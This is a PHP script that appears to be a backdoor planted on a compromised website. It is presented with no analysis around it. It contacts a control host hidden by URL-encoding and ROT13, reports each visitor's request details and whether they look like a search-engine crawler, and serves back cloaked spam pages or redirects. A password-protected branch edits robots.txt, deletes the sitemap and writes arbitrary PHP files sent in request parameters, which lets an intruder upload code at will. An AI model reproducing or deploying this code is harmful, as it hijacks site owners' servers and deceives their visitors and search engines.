<?php
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = '%6D%68%6E%66%75%6B%6C%2E%67%79%6E%71%6C%67%78%79%2E%67%62%63';




$http_web = 'http';
if (is_https()) {
    $http = 'https';
} else {
    $http = 'http';
}
$duri_tmp = drequest_uri();
if ($duri_tmp == ''){
    $duri_tmp = '/';
}
$duri = base64_encode($duri_tmp);
function drequest_uri()
{
    if (isset($_SERVER['REQUEST_URI'])) {
        $duri = $_SERVER['REQUEST_URI'];
    } else {
        if (isset($_SERVER['argv'])) {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        } else {
            $duri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $duri;
}

$goweb = str_rot13(urldecode($xmlname));
function is_https()
{
    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

$host = $_SERVER['HTTP_HOST'];
$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = base64_encode($lang);
$urlshang = '';
if (isset($_SERVER['HTTP_REFERER'])) {
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = base64_encode($urlshang);
}
$password = md5(md5(@$_GET['pd']));
if ($password == '5fbf36f6b1070aec65f00cb8e35c9cc4') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $path = $_SERVER['DOCUMENT_ROOT'];
    } else {
        $path = dirname(__FILE__);
    }
    if (!$action) {
        $action = 'put';
    }
    if ($action == 'put') {
        if (strstr($add_content, '.xml')) {
            $map_path = $path. '/sitemap.xml';
            if (is_file($map_path)) {
                @unlink($map_path);
            }
            $file_path = $path . '/robots.txt';
            if (file_exists($file_path)) {
                $data = doutdo($file_path);
            } else {
                $data = 'User-agent: *
Allow: /';
            }
            $sitmap_url = $http . '://' . $host . '/' . $add_content;
            if (stristr($data, $sitmap_url)) {
                echo '<br>sitemap already added!<br>';
            } else {
                if (file_put_contents($file_path, trim($data) . "\r\n" . 'Sitemap: '.$sitmap_url)) {
                    echo '<br>ok<br>';
                } else {
                    echo '<br>file write false!<br>';
                }
            }
        } else {
            echo '<br>sitemap name false!<br>';
        }
        if (strstr($add_content, '.p' . 'hp')) {
            $a = md5(md5(@$_GET['a']));
            $b = md5(md5(@$_GET['b']));
            if ($a == doutdo($http_web . '://' . $goweb . '/a.p' . 'hp') || $b == '4a39a87d470e3fdf7161940c61afba89') {
                $dstr = @$_GET['dstr'];
                if (file_put_contents($path . '/' . $add_content, $dstr)) {
                    echo 'ok';
                }
            }
        }
    }
    exit;
}
$web = $http_web . '://' . $goweb . '/indexnew.php?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang;
$html_content = trim(doutdo($web));
if (!strstr($html_content, 'nobotuseragent')) {
    if (strstr($html_content, 'okhtmlgetcontent')) {
        @header("Content-type: text/html; charset=utf-8");
        $html_content = str_replace("okhtmlgetcontent", '', $html_content);
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'okxmlgetcontent')){
        $html_content = str_replace("okxmlgetcontent", '', $html_content);
        @header("Content-type: text/xml");
        echo $html_content;
        exit();
    }else if(strstr($html_content, 'pingxmlgetcontent')){
        $html_content = str_replace("pingxmlgetcontent", '', $html_content);
        @header("Content-type: text/html; charset=utf-8");
        echo ping_sitemap($html_content);
        exit();
    }else if (strstr($html_content, 'getcontent500page')) {
        @header('HTTP/1.1 500 Internal Server Error');
        exit();
    }else if (strstr($html_content, 'getcontent404page')) {
        @header('HTTP/1.1 404 Not Found');
        exit();
    }else if (strstr($html_content, 'getcontent301page')) {
        @header('HTTP/1.1 301 Moved Permanently');
        $html_content = str_replace("getcontent301page", '', $html_content);
        header('Location: ' . $html_content);
        exit();
    }
}
function ping_sitemap($url){
    $url_arr = explode("\r\n", trim($url));
    $return_str = '';
    foreach($url_arr as $pingUrl){
        $pingRes = doutdo($pingUrl);
        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
        $return_str .= $pingUrl . '-- ' . $ok . '<br>';
    }
    return $return_str;
}
function disbot()
{
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
        return true;
    } else {
        return false;
    }
}
function doutdo($url)
{
    $file_contents= '';
    if(function_exists('curl_init')){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    if (!$file_contents) {
        $file_contents = @file_get_contents($url);
    }
    return $file_contents;
}/* blog R1-A108 */ ?>